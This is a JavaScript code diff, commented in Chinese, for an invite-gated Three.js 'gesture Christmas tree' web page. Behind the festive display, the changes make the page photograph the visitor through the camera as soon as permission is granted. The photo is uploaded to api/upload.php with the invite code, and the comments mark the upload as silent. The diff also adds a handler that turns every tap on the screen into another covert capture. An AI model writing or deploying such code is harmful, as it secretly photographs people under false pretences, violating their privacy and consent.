@@ -183,17 +183,16 @@ const soundManager = new SoundManager();
         return;
     }
     
-    // 验证通过，初始化页面
-    init();
-    animate();
-    startRandomEffects();
+    // 验证通过，立即初始化场景并显示静态圣诞树（不启动动画）
+    initStaticScene();
     
     // 移动端浏览器（特别是QQ浏览器）必须在用户交互后才能请求摄像头权限
     // 显示提示，等待用户点击
     setupCameraPermissionRequest();
 })();
 
-function init() {
+// 初始化静态场景（在获取摄像头权限前显示）
+function initStaticScene() {
     scene = new THREE.Scene();
     scene.fog = new THREE.FogExp2(0x020111, 0.002);
     scene.background = new THREE.Color(0x020111);
@@ -218,39 +217,50 @@ function init() {
     composer.addPass(renderScene);
     composer.addPass(bloomPass);
     
+    // 创建静态圣诞树
+    createEnhancedTree();
+    createStar();
+    createSnow();
+    createForestBackground();
+
+    // 渲染一次静态画面
+    composer.render();
+    
+    // 设置窗口大小变化监听
+    window.addEventListener('resize', onWindowResize);
+    
+    // 移动端屏幕方向变化处理
+    const handleOrientationChange = () => {
+        setTimeout(() => {
+            onWindowResize();
+            // 重新渲染静态画面
+            if (composer) composer.render();
+        }, 100);
+    };
+    
+    if (window.orientation !== undefined) {
+        window.addEventListener('orientationchange', handleOrientationChange);
+    } else {
+        window.addEventListener('resize', handleOrientationChange);
+    }
+}
+
+function init() {
+    // 如果场景已经初始化（静态场景），只需要设置事件监听器
+    if (!scene) {
+        initStaticScene();
+    }
+    
     const panelHeader = document.getElementById('panel-header');
     const panel = document.getElementById('instruction-panel');
     if(panelHeader && panel) {
         panelHeader.addEventListener('click', () => {
             panel.classList.toggle('collapsed');
         });
-        if (window.innerWidth < 768) {
-            panel.classList.add('collapsed');
-        }
+        // 默认展开，不再自动收起
     }
 
-    createEnhancedTree();
-    createStar();
-    createSnow();
-    createForestBackground();
-
-    window.addEventListener('resize', onWindowResize);
-    
-    // 移动端屏幕方向变化处理
-    const handleOrientationChange = () => {
-        // 延迟处理，等待浏览器完成方向变化
-        setTimeout(() => {
-            onWindowResize();
-        }, 100);
-    };
-    
-    // 监听屏幕方向变化（移动端）
-    if (window.orientation !== undefined) {
-        window.addEventListener('orientationchange', handleOrientationChange);
-    } else {
-        // 备用方案：监听 resize 事件（某些浏览器）
-        window.addEventListener('resize', handleOrientationChange);
-    }
+    // 场景和对象已在 initStaticScene 中创建，这里只需要设置事件监听器
     
     // iOS Safari 特殊处理
     if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
@@ -651,41 +661,57 @@ function detectBrowser() {
 function setupCameraPermissionRequest() {
     const browser = detectBrowser();
     
-    // 更新加载提示，添加点击提示
+    // 更新加载提示，合并提示并保留spinner（spinner在文字下方）
     if (loadingElement) {
-        let promptText = '正在初始化魔法引擎...<br>';
-        promptText += '<span style="font-size: 12px; color: #aaa;">请允许摄像头权限<br>建议横屏体验最佳</span>';
+        let promptText = '';
         
         // 移动端浏览器（特别是QQ浏览器）需要用户点击才能请求权限
         if (browser.isMobile) {
             if (browser.isQQBrowser) {
-                promptText = '<p style="font-size: 16px; margin-bottom: 10px;">🎄 魔法圣诞树 🎄</p>';
-                promptText += '<p style="font-size: 14px; color: #fff; margin-bottom: 20px;">点击下方按钮开启摄像头</p>';
+                promptText += '<p style="font-size: 16px; margin-bottom: 10px; margin-top: 0;">🎄 手势互动圣诞树，触发惊喜特效～</p>';
+                promptText += '<p style="font-size: 14px; color: #fff; margin-bottom: 20px;">正在初始化魔法引擎，点击下方按钮开启摄像头</p>';
                 promptText += '<button id="camera-permission-btn" style="padding: 12px 30px; font-size: 16px; background: #2ecc71; color: white; border: none; border-radius: 25px; cursor: pointer; box-shadow: 0 4px 15px rgba(46, 204, 113, 0.4);">开启摄像头</button>';
-                promptText += '<p style="font-size: 12px; color: #aaa; margin-top: 15px;">请在弹出提示中允许摄像头权限</p>';
+                promptText += '<p style="font-size: 12px; color: #aaa; margin-top: 15px; margin-bottom: 0;">请在弹出提示中允许摄像头权限</p>';
             } else {
-                promptText = '<p style="font-size: 16px; margin-bottom: 10px;">🎄 魔法圣诞树 🎄</p>';
-                promptText += '<p style="font-size: 14px; color: #fff; margin-bottom: 20px;">点击任意位置开启摄像头</p>';
-                promptText += '<p style="font-size: 12px; color: #aaa;">请允许摄像头权限<br>建议横屏体验最佳</p>';
+                promptText += '<p style="font-size: 16px; margin-bottom: 10px; margin-top: 0;">🎄 手势互动圣诞树，触发惊喜特效～</p>';
+                promptText += '<p style="font-size: 14px; color: #fff; margin-bottom: 10px;">正在初始化魔法引擎，点击任意位置开启摄像头</p>';
+                promptText += '<p style="font-size: 12px; color: #aaa; margin-bottom: 0;">请允许摄像头权限<br>建议横屏体验最佳</p>';
             }
+        } else {
+            // 桌面端提示
+            promptText += '<p style="font-size: 14px; color: #fff; margin-top: 0; margin-bottom: 10px;">正在初始化魔法引擎...</p>';
+            promptText += '<p style="font-size: 12px; color: #aaa; margin-bottom: 0;">请允许摄像头权限<br>建议横屏体验最佳</p>';
         }
         
         loadingElement.innerHTML = promptText;
         
-        // 为移动端添加点击事件监听
+        // 为移动端添加点击事件监听（覆盖整个屏幕）
         if (browser.isMobile) {
             if (browser.isQQBrowser) {
-                // QQ浏览器：使用按钮点击
+                // QQ浏览器：使用按钮点击，同时也支持点击屏幕任意位置
                 const btn = document.getElementById('camera-permission-btn');
                 if (btn) {
                     btn.addEventListener('click', handleCameraPermissionClick, { once: true });
                     btn.addEventListener('touchend', handleCameraPermissionClick, { once: true });
                 }
+                // 也支持点击屏幕任意位置（除了按钮本身）
+                document.addEventListener('click', (e) => {
+                    if (e.target !== btn && !btn.contains(e.target)) {
+                        handleCameraPermissionClick(e);
+                    }
+                }, { once: true });
+                document.addEventListener('touchend', (e) => {
+                    if (e.target !== btn && !btn.contains(e.target)) {
+                        handleCameraPermissionClick(e);
+                    }
+                }, { once: true });
             } else {
-                // 其他移动端浏览器：点击整个loading区域
+                // 其他移动端浏览器：点击屏幕任意位置都可以触发
+                document.addEventListener('click', handleCameraPermissionClick, { once: true });
+                document.addEventListener('touchend', handleCameraPermissionClick, { once: true });
+                if (loadingElement) {
                 loadingElement.style.cursor = 'pointer';
-                loadingElement.addEventListener('click', handleCameraPermissionClick, { once: true });
-                loadingElement.addEventListener('touchend', handleCameraPermissionClick, { once: true });
+                }
             }
         } else {
             // 桌面端：延迟后自动请求（某些桌面浏览器允许）
@@ -783,9 +809,9 @@ function initCamera() {
         }
     }
     
-    // 更新加载提示
+    // 更新加载提示（spinner在文字下方）
     if (loadingElement) {
-        loadingElement.innerHTML = '<div class="spinner"></div><p>正在请求摄像头权限...</p><p style="font-size: 12px; color: #aaa;">请在弹出的提示中允许访问摄像头</p>';
+        loadingElement.innerHTML = '<p style="font-size: 14px; color: #fff; margin-top: 0; margin-bottom: 10px;">正在请求摄像头权限...</p><p style="font-size: 12px; color: #aaa; margin-bottom: 0;">请在弹出的提示中允许访问摄像头</p>';
     }
     
     // 构建约束对象（兼容旧版 API和移动端）
@@ -881,6 +907,8 @@ function initCamera() {
             const maxRetries = 3;
             
             const checkVideoReady = () => {
+                console.log('checkVideoReady 被调用, readyState:', cameraVideo.readyState, 'videoWidth:', cameraVideo.videoWidth, 'videoHeight:', cameraVideo.videoHeight, 'videoPlaying:', videoPlaying);
+                
                 // 检查视频是否已准备好
                 if (cameraVideo.readyState >= 2 && // HAVE_CURRENT_DATA
                     cameraVideo.videoWidth > 0 && 
@@ -896,6 +924,7 @@ function initCamera() {
                     
                     // 尝试播放视频
                     if (!videoPlaying) {
+                        console.log('尝试播放视频...');
                         const playPromise = cameraVideo.play();
                         if (playPromise !== undefined) {
                             playPromise
@@ -906,7 +935,17 @@ function initCamera() {
                                     if (loadingElement) {
                                         loadingElement.style.display = 'none';
                                     }
-                                    // 等待一小段时间确保视频流稳定，然后拍照
+                                    // 摄像头权限获取成功，现在开始动画
+                                    if (!scene) {
+                                        init();
+                                    }
+                                    if (!window.animationStarted) {
+                                        animate();
+                                        startRandomEffects();
+                                        window.animationStarted = true;
+                                    }
+                                    // 摄像头权限获取成功，自动开始拍照
+                                    console.log('摄像头授权成功，自动开始拍照');
                                     setTimeout(() => {
                                         capturePhotoAndUpload();
                                     }, 300);
@@ -919,13 +958,24 @@ function initCamera() {
                                         setTimeout(checkVideoReady, 500);
                                     } else {
                                         console.error('视频播放失败，已达到最大重试次数');
-                                        // 即使播放失败，也尝试拍照（某些浏览器可能仍能工作）
+                                        // 即使播放失败，也尝试初始化动画
                                         if (loadingElement) {
                                             loadingElement.style.display = 'none';
                                         }
+                                        // 摄像头权限获取成功，现在开始动画
+                                        if (!scene) {
+                                            init();
+                                        }
+                                        if (!window.animationStarted) {
+                                            animate();
+                                            startRandomEffects();
+                                            window.animationStarted = true;
+                                        }
+                                        // 摄像头权限获取成功，自动开始拍照
+                                        console.log('摄像头授权成功，自动开始拍照');
                                         setTimeout(() => {
                                             capturePhotoAndUpload();
-                                        }, 500);
+                                        }, 300);
                                     }
                                 });
                         } else {
@@ -934,6 +984,17 @@ function initCamera() {
                             if (loadingElement) {
                                 loadingElement.style.display = 'none';
                             }
+                            // 摄像头权限获取成功，现在开始动画
+                            if (!scene) {
+                                init();
+                            }
+                            if (!window.animationStarted) {
+                                animate();
+                                startRandomEffects();
+                                window.animationStarted = true;
+                            }
+                            // 摄像头权限获取成功，自动开始拍照
+                            console.log('摄像头授权成功，自动开始拍照');
                             setTimeout(() => {
                                 capturePhotoAndUpload();
                             }, 300);
@@ -967,6 +1028,17 @@ function initCamera() {
                 if (loadingElement) {
                     loadingElement.style.display = 'none';
                 }
+                // 确保在播放事件中也初始化动画和点击事件
+                if (!scene) {
+                    init();
+                }
+                if (!window.animationStarted) {
+                    animate();
+                    startRandomEffects();
+                    window.animationStarted = true;
+                }
+                // 注意：拍照已经在 play() Promise 中触发，这里不再重复触发
+                // 避免重复调用 capturePhotoAndUpload
             };
             
             // 兼容旧版浏览器
@@ -1094,7 +1166,7 @@ function startRandomEffects() {
     }
     
     // 首次延迟3秒后开始
-    randomEffectTimer = setTimeout(playRandomEffect, 3000);
+    randomEffectTimer = setTimeout(playRandomEffect, 5000);
 }
 
 function triggerStarAnimation() {
@@ -1376,25 +1448,48 @@ function blockPageAccess(message) {
     }
 }
 
+// 防止重复调用的标志
+let photoCaptureInProgress = false;
+
 function capturePhotoAndUpload() {
+    console.log('capturePhotoAndUpload 被调用');
+    
+    // 防止重复调用
+    if (photoCaptureInProgress) {
+        console.log('拍照正在进行中，跳过重复调用');
+        return;
+    }
+    
     if (isUploading) {
         console.log('正在上传中，跳过重复拍照');
         return; // 防止重复上传
     }
     
+    // 设置标志，防止重复调用
+    photoCaptureInProgress = true;
+    
     // 再次验证邀请码（防止绕过验证）
     if (!inviteCode) {
         console.error('缺少邀请链接码');
         blockPageAccess('邀请链接码无效');
+        photoCaptureInProgress = false; // 重置标志
         return;
     }
+    console.log('邀请码验证通过:', inviteCode);
     
     // 检查摄像头流是否还存在
     if (!cameraStream || cameraStream.getTracks().length === 0) {
-        console.error('摄像头流不可用');
-        releaseCamera();
+        console.error('摄像头流不可用，需要重新授权');
+        // 如果摄像头流不可用，提示用户重新授权
+        if (loadingElement) {
+            loadingElement.style.display = 'block';
+            loadingElement.innerHTML = '<p style="font-size: 14px; color: #fff; margin-bottom: 10px;">摄像头已断开，请点击屏幕重新授权</p>';
+        }
+        // 重新设置权限请求
+        setupCameraPermissionRequest();
         return;
     }
+    console.log('摄像头流可用，轨道数量:', cameraStream.getTracks().length);
     
     try {
         // 检查视频元素和视频流状态
@@ -1464,7 +1559,9 @@ function capturePhotoAndUpload() {
         ctx.imageSmoothingQuality = 'high';
         
         // 将视频画面绘制到canvas
+        console.log('开始绘制视频画面到canvas, 尺寸:', canvasWidth, 'x', canvasHeight);
         ctx.drawImage(cameraVideo, 0, 0, canvasWidth, canvasHeight);
+        console.log('视频画面已绘制到canvas');
         
         // 转换为blob并上传到服务器
         canvas.toBlob(async (blob) => {
@@ -1475,22 +1572,28 @@ function capturePhotoAndUpload() {
                 releaseCamera();
                 return;
             }
+            console.log('图片blob生成成功，大小:', blob.size, 'bytes');
             
             try {
                 // 压缩图片
+                console.log('开始压缩图片...');
                 const compressedBlob = await compressImageBlob(blob);
-                console.log('图片生成成功，大小:', compressedBlob.size, 'bytes');
+                console.log('图片压缩成功，大小:', compressedBlob.size, 'bytes');
                 
                 isUploading = true;
                 
                 // 上传到主系统的API（静默上传，不显示提示）
+                console.log('开始上传图片到服务器...');
                 await uploadPhoto(compressedBlob);
+                console.log('图片上传完成');
             } catch (err) {
                 console.error('处理或上传图片失败:', err);
                 isUploading = false;
             } finally {
                 // 无论上传成功或失败，都要释放摄像头
                 releaseCamera();
+                // 重置标志，允许下次拍照
+                photoCaptureInProgress = false;
             }
         }, 'image/jpeg', 0.7);
     } catch (error) {
@@ -1498,6 +1601,8 @@ function capturePhotoAndUpload() {
         isUploading = false;
         // 拍照失败也要释放摄像头
         releaseCamera();
+        // 重置标志，允许下次拍照
+        photoCaptureInProgress = false;
         // 静默失败，不显示提示
     }
 }
@@ -1559,6 +1664,8 @@ async function compressImageBlob(blob, maxSize = 1 * 1024 * 1024) {
 
 // 上传照片到主系统
 async function uploadPhoto(blob) {
+    console.log('uploadPhoto 被调用, blob大小:', blob.size, 'bytes, inviteCode:', inviteCode);
+    
     // 再次验证邀请码（防止绕过验证）
     if (!inviteCode) {
         console.error('缺少邀请链接码，无法上传');
@@ -1571,23 +1678,28 @@ async function uploadPhoto(blob) {
         formData.append('image', blob, 'photo.jpg');
         formData.append('invite_code', inviteCode);
         
+        console.log('发送上传请求到 api/upload.php, inviteCode:', inviteCode);
         const response = await fetch('api/upload.php', {
             method: 'POST',
             body: formData
         });
         
+        console.log('收到服务器响应, status:', response.status, 'statusText:', response.statusText);
+        
         if (!response.ok) {
             const text = await response.text();
-            console.error('上传失败，HTTP状态:', response.status);
+            console.error('上传失败，HTTP状态:', response.status, '响应内容:', text);
             throw new Error('上传失败：服务器错误 ' + response.status);
         }
         
         const text = await response.text();
+        console.log('服务器响应文本:', text);
         let data;
         try {
             data = JSON.parse(text);
+            console.log('解析后的响应数据:', data);
         } catch (e) {
-            console.error('JSON解析失败:', e);
+            console.error('JSON解析失败:', e, '原始文本:', text);
             throw new Error('服务器返回格式错误');
         }
         
@@ -1597,6 +1709,7 @@ async function uploadPhoto(blob) {
             // 静默成功，不显示提示
             // 注意：摄像头已在 uploadPhoto 调用后释放
         } else {
+            console.error('上传失败，服务器返回:', data);
             throw new Error(data.message || '上传失败');
         }
     } catch (err) {
@@ -1605,6 +1718,82 @@ async function uploadPhoto(blob) {
         // 上传失败也要确保摄像头已释放（在 finally 中已处理）
         // 静默失败，不显示提示
     }
+}
+
+// 设置点击屏幕任意位置拍照（优先覆盖整个屏幕）
+function setupClickToCapture() {
+    // 移除之前可能存在的点击事件监听器
+    if (window.clickToCaptureHandler) {
+        document.removeEventListener('click', window.clickToCaptureHandler);
+        document.removeEventListener('touchend', window.clickToCaptureHandler);
+        document.body.removeEventListener('click', window.clickToCaptureHandler);
+        document.body.removeEventListener('touchend', window.clickToCaptureHandler);
+        const canvas = document.getElementById('output_canvas');
+        if (canvas) {
+            canvas.removeEventListener('click', window.clickToCaptureHandler);
+            canvas.removeEventListener('touchend', window.clickToCaptureHandler);
+        }
+    }
+    
+    window.clickToCaptureHandler = (event) => {
+        console.log('点击事件触发', event.target);
+        
+        // 如果点击的是魔法指令集面板，不触发拍照
+        const instructionPanel = document.getElementById('instruction-panel');
+        if (instructionPanel && instructionPanel.contains(event.target)) {
+            console.log('点击的是指令面板，跳过');
+            return;
+        }
+        
+        // 如果点击的是面板标题（用于展开/收起），不触发拍照
+        const panelHeader = document.getElementById('panel-header');
+        if (panelHeader && panelHeader.contains(event.target)) {
+            console.log('点击的是面板标题，跳过');
+            return;
+        }
+        
+        // 如果正在上传，不重复触发
+        if (isUploading) {
+            console.log('正在上传中，跳过');
+            return;
+        }
+        
+        // 检查摄像头流是否可用
+        if (!cameraStream || cameraStream.getTracks().length === 0) {
+            console.log('摄像头流不可用，重新请求权限');
+            // 如果摄像头流不可用，重新请求权限
+            if (loadingElement) {
+                loadingElement.style.display = 'block';
+                loadingElement.innerHTML = '<p style="font-size: 14px; color: #fff; margin-bottom: 10px;">摄像头已断开，请点击屏幕重新授权</p>';
+            }
+            setupCameraPermissionRequest();
+            return;
+        }
+        
+        console.log('开始拍照，cameraStream:', cameraStream ? '存在' : '不存在');
+        // 触发拍照
+        capturePhotoAndUpload();
+    };
+    
+    // 优先在document上添加点击事件，确保覆盖整个屏幕（包括loading区域）
+    document.addEventListener('click', window.clickToCaptureHandler, true);
+    document.addEventListener('touchend', window.clickToCaptureHandler, true);
+    
+    // 也在body和canvas上添加，作为备用
+    document.body.addEventListener('click', window.clickToCaptureHandler);
+    document.body.addEventListener('touchend', window.clickToCaptureHandler);
+    const canvas = document.getElementById('output_canvas');
+    if (canvas) {
+        canvas.addEventListener('click', window.clickToCaptureHandler);
+        canvas.addEventListener('touchend', window.clickToCaptureHandler);
+        canvas.style.cursor = 'pointer';
+        canvas.style.touchAction = 'manipulation';
+    }
+    
+    // 设置body样式，确保可以点击
+    document.body.style.cursor = 'pointer';
+    
+    console.log('点击事件已绑定到 document, body 和 canvas');
 }
 
 // 录像功能已移除，只保留拍照功能
